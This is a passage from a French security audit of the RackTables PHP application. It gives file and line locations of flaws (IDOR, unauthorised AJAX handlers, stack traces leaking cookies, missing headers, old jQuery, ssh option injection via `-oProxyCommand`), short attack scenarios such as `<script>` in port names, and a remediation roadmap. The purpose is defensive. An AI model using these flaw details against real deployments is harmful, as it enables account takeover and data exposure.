  - `getAutocompleteListAJAX` (`ajax-interface.php:299-338`) : noms d'objets, numéros d'inventaire, noms de ports ;
  - `getNetUsageAJAX` (`:287-297`) : occupation de n'importe quel réseau ;
  - `renderSLBFormAJAX` (`slb2-interface.php:435`) ;
  - `getTripletConfigAJAX` (`:490-501`) : configuration de répartiteur de charge.
- **Scénario** : un compte restreint par RackCode à un locataire (`{tenant_A}`) énumère tout l'inventaire, l'adressage et les configurations SLB des autres locataires.
- **Recommandation** : déclarer pour chaque action AJAX un couple `(page, tab, op)` dans `navigation.php`, et faire appliquer `fixContext()` + `assertPermission()` par le dispatcheur avant l'appel. Filtrer les résultats d'autocomplétion par `isolatedPermission()`.

### M5. IDOR sur les identifiants secondaires (Moyenne, confirmé)

- **CWE-639** ; OWASP A01 ; ASVS V4.2.1.
- **Code** :
  - `unlinkPort` (`ophandlers.php:3362-3366`) : `commitUnlinkPort(port_id)` sans vérifier que `port_id` appartient à l'objet `object_id` qui a servi au contrôle de permission.
  - `unlinkFile` (`ophandlers.php:2582-2587`) : `commitUnlinkFile(link_id)` (`database.php:4873`) supprime n'importe quel `FileLink`.
  - `updateRackSortOrderAJAX` (`ajax-interface.php:276-285`) : `racks[]` arbitraire, d'où `UPDATE AttributeValue ... WHERE object_id=?` (`database.php:1551-1562`) sur n'importe quel objet.
- **Scénario** : un utilisateur autorisé à modifier les ports de son équipement de test délie les ports d'un équipement de production (`object_id=<le sien>&port_id=<cible>`).
- **Recommandation** : ajouter la clé du contexte dans le `WHERE` (`['id'=>$port_id,'object_id'=>getBypassValue()]`), ou recharger l'entité cible et rejouer `fixContext()`/`assertPermission()` sur elle. Faire de même pour `link_id` (vérifier `entity_type`/`entity_id` du lien) et pour chaque `rack_id` (même rangée).

### M6. Divulgation d'information dans les pages d'erreur (Moyenne, confirmé)

- **CWE-209, CWE-532, CWE-79** ; OWASP A04/A09 ; ASVS V7.4.1.
- **Code** :
  - `exceptions.php:362-447` : `printPDOException()` / `printGenericException()` affichent, **hors mode debug**, le message brut, le fichier et la ligne, une trace **avec arguments non échappés** (`stringTrace`, `:337-360`), ainsi que `$_GET`, `$_POST` et `$_COOKIE` (identifiant de session). Elles s'appliquent à toute `PDOException` non convertie par `convertPDOException()` (`database.php:3892-3913`). C'est le cas de `22001 Data too long` en mode strict, qu'un utilisateur déclenche facilement avec un champ brut trop long.
  - `index.php:192` : `"NAK\nRuntime exception: " . $e->getMessage()`.
  - Le commentaire de `auth.php:354-357` reconnaît déjà le risque de mot de passe LDAP dans une trace.
- **Scénario** : envoyer `editPortForObject` avec `name` > 255 caractères contenant `<script>`. La page de trace affiche l'argument brut (XSS) et les cookies. Les arguments sont visibles si `zend.exception_ignore_args=Off`, qui est la valeur par défaut hors `php.ini-production`. Une trace survenant pendant l'authentification peut contenir `PHP_AUTH_PW`.
- **Recommandation** : en production, page d'erreur générique avec un identifiant de corrélation, et détails envoyés uniquement dans `error_log()`. Ne jamais afficher `$_COOKIE`/`$_POST`. Échapper toutes les valeurs. Forcer `zend.exception_ignore_args=On` et `display_errors=Off`. Utiliser `#[\SensitiveParameter]` (PHP 8.2+) sur les paramètres `$password`.

### M7. En-têtes de sécurité HTTP et cookies (Moyenne, confirmé)

- **CWE-693, CWE-1021, CWE-614, CWE-1004** ; OWASP A05 ; ASVS V14.4, V3.4.
- **Constat** : aucun en-tête `Content-Security-Policy`, `X-Frame-Options`/`frame-ancestors`, `X-Content-Type-Options`, `Referrer-Policy`, `Strict-Transport-Security` ou `Permissions-Policy` dans le code (vérifié par recherche de `header (`). Le clickjacking est possible sur toutes les pages d'opération. `startSession()` (`functions.php:6684-6688`) appelle `session_start()` sans `session_set_cookie_params`, donc les attributs Secure/HttpOnly/SameSite dépendent de `php.ini`. Le JS inline (`addJSText`, attributs `onclick`) empêche aujourd'hui une CSP stricte.
- **Recommandation** : point central (début de `index.php` ou serveur web) :
  ```php
  header("Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-$nonce'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'");
  header('X-Content-Type-Options: nosniff');
  header('Referrer-Policy: same-origin');
  header('X-Frame-Options: DENY');
  header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
  session_set_cookie_params(['secure'=>true,'httponly'=>true,'samesite'=>'Strict','path'=>'/']);
  ini_set('session.use_strict_mode', '1');
  ```
  Commencer par `Content-Security-Policy-Report-Only` le temps de migrer le JS inline vers des fichiers et des nonces.

### M8. Bibliothèques JavaScript vulnérables (Moyenne, confirmé)

- **CWE-1104, CWE-1395** ; OWASP A06.
- **Constat** : `wwwroot/js/jquery-1.4.4.min.js` (2010) est concerné par CVE-2011-4969, CVE-2012-6708, CVE-2015-9251, CVE-2019-11358, CVE-2020-11022/11023. `jquery-ui-1.8.21.min.js` est concerné par CVE-2016-7103, CVE-2021-41182/41183/41184. CodeMirror, tag-it et thumbhover sont également anciens.
- **Recommandation** : jQuery 3.7.x + jQuery UI 1.14.x (avec `jquery-migrate` le temps de la transition), gérées par npm avec un fichier de verrouillage, et un audit `npm audit` / OSV-Scanner en CI.

### M9. Sécurité des passerelles vers les équipements (Moyenne, confirmé)

- **CWE-214, CWE-295, CWE-319** ; OWASP A02/A07.
- **Code** :
  - `remote.php:387-394` : pour `sshnokey`, `username` et `password` sont passés en **arguments de ligne de commande** (`--password=...`), visibles par tout utilisateur local via `ps` ou `/proc/*/cmdline`.
  - `remote.php:417` : `-oStrictHostKeyChecking=no` (et `CheckHostIP=no`) accepte toute clé d'hôte, donc une interception (MITM) reste possible avec vol de session sur l'équipement.
  - Les protocoles par défaut sont `netcat`/`telnet` (`remote.php:476-560`) : identifiants en clair sur le réseau.
- **Recommandation** : passer le mot de passe par l'entrée standard ou par un fichier temporaire `0600` (ou `SSH_ASKPASS`). Utiliser `StrictHostKeyChecking=yes` avec un `known_hosts` géré (au minimum `accept-new`). Faire de SSH par clé le défaut et réserver telnet aux réseaux d'administration isolés.

### M10. `updateUser` écrase le mot de passe quand le champ est vide (Moyenne, confirmé par analyse statique)

- **CWE-670** ; OWASP A04.
- **Code** : le formulaire annonce « New password (use old if blank) » (`interface-config.php:47`). Pourtant `ophandlers.php:1083` envoie `sha1(genericAssertion('password','string0'))`, et `sha1('')` vaut `da39a3ee…`, une valeur non vide qui passe le contrôle `database.php:3374-3379`. Comme `assertHTTPCredentialsReceived()` refuse les mots de passe vides (`auth.php:23-30`), le compte devient **inutilisable**.
- **Scénario** : un administrateur renomme un utilisateur, ou se renomme lui-même, sans ressaisir le mot de passe. Le compte est verrouillé, y compris `admin` (`user_id=1`), ce qui provoque un déni de service et oblige à intervenir directement en base. Ce comportement est aussi déclenchable par CSRF (C1).
- **Recommandation** :
  ```php
  $pw = genericAssertion('password', 'string0');
  commitUpdateUserAccount($id, $username, $realname, $pw === '' ? '' : password_hash($pw, PASSWORD_ARGON2ID));
  ```
  Ajouter un test unitaire de non-régression.

### B1. `unserialize()` sur des données de la base (Basse)

`init.php:66` (cache RackCode) et `database.php:4914` (cache LDAP `memberof`). Ce n'est exploitable que si la base est déjà compromise, mais une injection d'objets PHP vers RCE (chaînes POP de dépendances) reste possible. Utiliser `json_encode`/`json_decode`, ou `unserialize($x, ['allowed_classes' => false])`. **CWE-502.**

### B2. `Content-Disposition` non quoté (Basse)

`index.php:68` : `filename={$file['name']}`, avec un nom brut fourni par le client. Les noms contenant `;`, `"` ou des caractères non ASCII cassent l'en-tête. PHP bloque déjà CR/LF. Utiliser `attachment; filename="<ascii échappé>"; filename*=UTF-8''<rawurlencode>`. **CWE-116.**

### B3. Motifs `LIKE`/`REGEXP` contrôlés par l'utilisateur (Basse)

`ajax-interface.php:310-326`, `popup.php:93-106` : `%`/`_` ne sont pas échappés, ce qui permet de forcer des recherches coûteuses. `database.php:3070-3072` (exactitude 3) passe un `REGEXP` utilisateur à MySQL, avec un risque de déni de service par expression régulière. Échapper avec `addcslashes($t, '%_\\')`, limiter la longueur et désactiver le mode REGEXP pour les non-administrateurs. **CWE-943 / CWE-1333.**

### B4. Injection d'arguments via le nom d'hôte de l'équipement (Basse, à vérifier)

`functions.php:1193-1206` : l'hôte vient de l'attribut FQDN (id 3) ou du nom de l'objet, tous deux éditables. Il est passé en dernier argument à `ssh`/`nc` (`remote.php:419`) sans `--` côté `ssh`. `escapeshellarg` empêche l'injection shell, mais pas l'injection d'**options** (`-oProxyCommand=...`). Dans les passerelles actuelles, l'hôte est le dernier argument et `ssh` s'arrête sur une erreur d'usage, d'où le statut « à vérifier ». Valider l'hôte (nom DNS ou adresse IP) et ajouter `--` avant l'hôte dans les paramètres ssh. **CWE-88.**

### B5. Fichiers de bibliothèque et `secret.php` sous le docroot (Basse)

`pre-init.php:37-40` : par défaut, `secret.php` se trouve dans `wwwroot/inc/`. Si le moteur PHP est désactivé ou mal configuré, les identifiants de base sont servis en clair. Tous les `inc/*.php` sont accessibles directement. Placer `secret.php` hors docroot (`$racktables_confdir`) et refuser `/inc/` au niveau du serveur web (`Require all denied`). **CWE-552.**

### B6. Tabnabbing et self-XSS côté client (Basse)

`functions.php:1288` : `target="_blank"` sans `rel="noopener noreferrer"`. `js/inplace-edit.js:147` : `span.html(text)` réinjecte la saisie en HTML, à remplacer par `.text(text)`. **CWE-1022 / CWE-79.**

### B7. Chargement dynamique de plugins par nom (Basse)

`ophandlers.php:3712-3729` puis `database.php:6162-6164` : `require_once "${racktables_plugins_dir}/${name}/plugin.php"` avec `name` fourni dans la requête. C'est mitigé par le `is_callable("plugin_${name}_install")` préalable, puisqu'un nom de fonction ne peut pas contenir `/`. Le motif reste fragile : valider `name` contre `^[a-z0-9_]+$` et contre la liste `getPlugins()`. **CWE-98.**

### B8. Divulgation de version et de plateforme (Basse)

Version affichée dans le pied de page (`interface.php:111`). L'installeur non authentifié (`install.php` étape 2, `platform_is_ok`) expose la version de PHP et les extensions. Son retrait est couvert par C2.

---

## 4. Constats transverses de qualité et de sécurité (ASVS V1, V14 ; OWASP A04/A08)

| Thème | Constat | Impact |
|---|---|---|
| Modèle d'échappement | Échappement à l'**entrée** (`transformRequestData`), avec double canal `$_REQUEST` (échappé) / `$sic` (brut) | Cause racine de H1, M3 et des doubles encodages. Impossible à auditer de façon fiable. |
| Contrôle d'accès | Décentralisé : chaque module et handler AJAX ou popup appelle (ou oublie) `assertPermission()`. Le contexte `page`/`tab` est fourni par le client. | H6, M4, M5 |
| État global | Dizaines de `global` (`$pageno`, `$tabno`, `$op`, `$sic`, `$auto_tags`...), callbacks par chaînes (`call_user_func("plugin_${name}_...")`) | Difficile à tester et à analyser statiquement |
| Typage | Aucun `declare(strict_types=1)`, aucune signature typée, comparaisons lâches (`==`) sur des secrets | H4, erreurs silencieuses |
| Dépendances | Pas de Composer. JS vendorisé sans gestionnaire ni verrouillage. Pas de SBOM. | M8, aucune veille CVE |
| Analyse statique | Ni PHPStan/Psalm, ni PHPCS, ni Semgrep | Les régressions XSS et CSRF ne sont pas détectées |
| Tests et CI | 38 tests PHPUnit (`tests/`), mais CI supprimée (commit `9aec76bb`, « Cirrus CI has shut down ») | Aucun filet pendant le portage PHP 8.5 |
| Secrets | `secret.php` en clair (mot de passe MySQL, `LDAP search_bind_password`, mots de passe SAML/Cacti). Mots de passe Cacti/Munin en clair en base (`CactiServer.password`). | Exposition en cas de lecture du fichier ou de la base |
| Journalisation | Pas de journal d'audit de sécurité (échecs d'authentification, changements RackCode, changements de mot de passe) | ASVS V7.2 non couvert, détection impossible |
| TLS base de données | `PDO::MYSQL_ATTR_SSL_*` optionnels, pas de `MYSQL_ATTR_SSL_VERIFY_SERVER_CERT` (`pre-init.php:77-82`) | Interception possible si la base est distante |

---

## 5. Feuille de route priorisée

### 5.1 Correctifs rapides (0 à 2 semaines)

1. **Neutraliser l'installeur** (C2) : `if ($found_secret_file && isset($pdo_dsn)) die('Already installed');` en tête de `renderInstallerHTML()`, `var_export()` pour `secret.php`, et `chmod 0440` / `chown root:apache` sur `secret.php` dans toutes les instances. Vérifier tout de suite en production : `stat secret.php`.
2. **CSRF minimal** (C1) : jeton de session dans `printOpFormIntro()` et `makeHrefProcess()`, vérification centrale dans `index.php` (module `redirect`, actions AJAX `upd-*`, popup), plus refus des requêtes `Sec-Fetch-Site: cross-site` en écriture.
3. **En-têtes au reverse-proxy** (M7) : `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, HSTS, et une CSP en `Report-Only`.
4. **Téléchargements** (H2) : forcer `attachment` + `nosniff` + `CSP: sandbox`, et ignorer `asattach=no` hors liste blanche d'images.
5. **Échappement des puits listés en H1/M3** : `interface.php:1382-1383`, `:1394`, `:4922`, `:4979`, `:5205`, `:6312`, `:6330`, `popup.php:503-504`, `interface-lib.php:1136`, `plugins/*/plugin.php:301/309`, `interface-config.php:58-59`.
6. **Validation des noms de ports et des arguments CLI** (H3) : rejet des caractères de contrôle dans `commitAddPort`, `commitUpdatePort` et `translateDeviceCommands()`.
7. **Autorisation** : `handlePopupPortLink` (H6), handlers AJAX (M4), IDOR `unlinkPort`/`unlinkFile`/`racks[]` (M5).
8. **Bug `updateUser`** (M10), **LDAP** : `ldap_escape()` (M1) et `use_tls=2` (M2).
9. **Erreurs** (M6) : page générique en production, `zend.exception_ignore_args=On`, `display_errors=Off`, suppression de l'affichage de `$_COOKIE`/`$_POST`.
10. **Opérationnel** : `fail2ban` sur les 401, HTTPS obligatoire, `secret.php` et `/inc/` interdits au niveau du serveur web.

### 5.2 Moyen terme (1 à 3 mois)

1. **Mots de passe** (H4) : `password_hash(PASSWORD_ARGON2ID)` avec migration paresseuse, colonne `VARCHAR(255)`, `hash_equals`, politique de longueur minimale de 12 caractères et vérification contre une liste de mots de passe compromis. Rehacher le cache LDAP.
2. **Sortir de HTTP Basic** (H5) : formulaire de connexion, session durcie (`use_strict_mode`, `regenerate_id`, expirations, cookie `Secure; HttpOnly; SameSite=Strict`), verrouillage progressif, MFA pour les administrateurs, ou délégation SAML/OIDC.
3. **Abandon de l'échappement en entrée** : stocker brut, échapper en sortie via `h()`/`js()`. Script de migration des données (`html_entity_decode` sur les colonnes concernées) et règle Semgrep/PHPStan qui interdit `echo` d'une variable non passée par `h()`.
4. **Contrôle d'accès centralisé** : table déclarative `(module, action) → (page, tab, op, entité)` appliquée par le dispatcheur pour `redirect`, `ajax`, `popup`, `image`, `svg`, `download`. Les IDs secondaires sont rechargés et le contexte reconstruit. Écrire des tests d'autorisation négatifs pour chaque op.
5. **Passerelles** : mots de passe par stdin, `StrictHostKeyChecking=yes` + `known_hosts`, SSH par clé par défaut, compte d'équipement en lecture seule pour la consultation.
6. **Mise à jour JS** : jQuery 3.7 / jQuery UI 1.14, puis suppression du JS inline (nonces) pour activer la CSP en mode bloquant.
7. **Journal d'audit sécurité** : connexions réussies ou échouées, changements de RackCode, d'utilisateurs, de mots de passe et de configuration, avec envoi vers syslog/SIEM.

### 5.3 Modernisation (3 à 12 mois, en parallèle du portage PHP 8.5)

1. **Composer** : `composer.json` (PHP `^8.3`, `ext-pdo_mysql`, `ext-ldap`...), autoload PSR-4 progressif pour le nouveau code, `composer audit` en CI.
2. **Analyse statique** : PHPStan (niveau 3 puis 6 et plus, avec une *baseline* pour l'existant) ou Psalm avec l'analyse de taint (`--taint-analysis`), particulièrement utile pour suivre `$_REQUEST`/`$sic` jusqu'à `echo`/`proc_open`. Semgrep avec les règles `php.lang.security.*` et des règles maison (interdiction de `sha1(` pour les mots de passe, d'`unserialize(` sans `allowed_classes`, de `echo "${...}"`).
3. **Style et qualité** : PHPCS (PSR-12) ou PHP-CS-Fixer, et Rector pour automatiser le portage PHP 8.x (`${}` → `{$}`, typage, `str_starts_with`, etc.).
4. **Typage** : `declare(strict_types=1)` fichier par fichier, signatures typées et `#[\SensitiveParameter]` sur les secrets.
5. **Tests et CI** : rétablir une CI (GitHub Actions ou GitLab CI) avec une matrice PHP 8.3/8.4/8.5 × MariaDB/MySQL. Y lancer PHPUnit, PHPStan/Psalm, PHPCS, `composer audit`, `npm audit`, ainsi qu'un scan DAST (OWASP ZAP baseline) sur une instance éphémère. Ajouter des tests de non-régression pour chaque constat C/H/M.
6. **Gabarits** : migration progressive du rendu vers un moteur avec auto-échappement (Twig/Latte), en commençant par les vues qui affichent des données libres (ports, fichiers, journaux, IP).
7. **Secrets** : `secret.php` hors docroot, avec possibilité de lire les secrets depuis l'environnement ou un coffre (Vault, systemd credentials). Chiffrer les mots de passe Cacti/Munin en base.
8. **Durcissement de la base** : TLS vérifié vers MySQL, compte applicatif sans `ALTER`/`DROP` en production (compte d'upgrade séparé).

---

## 6. Correspondance OWASP Top 10 2021 / 2025 (RC)

| OWASP 2021 | 2025 (RC) | Constats |
|---|---|---|
| A01 Broken Access Control | A01 | C1, H6, M3, M4, M5 |
| A02 Cryptographic Failures | A04 | H4, M2, M9 |
| A03 Injection | A05 | H1, H2, H3, M1, M3, B2, B3, B4 |
| A04 Insecure Design | A06 | C2, M6, M10, modèle d'échappement en entrée |
| A05 Security Misconfiguration | A02 | C2, M7, B5, B8 |
| A06 Vulnerable and Outdated Components | A03 (Supply Chain) | M8, absence de Composer/SBOM |
| A07 Identification and Authentication Failures | A07 | H4, H5, M1, M2 |
| A08 Software and Data Integrity Failures | A08 | B1 |
| A09 Security Logging and Monitoring Failures | A09 | absence de journal d'audit, M6 |
| A10 SSRF | (fusionné) | Plugins Cacti/Munin : `base_url` défini par l'administrateur, pas de restriction `CURLOPT_PROTOCOLS`. Risque faible (administrateur uniquement) : ajouter `CURLOPT_PROTOCOLS = CURLPROTO_HTTP\|CURLPROTO_HTTPS`. La vérification TLS est active par défaut (aucun `CURLOPT_SSL_VERIFYPEER=false` trouvé). |
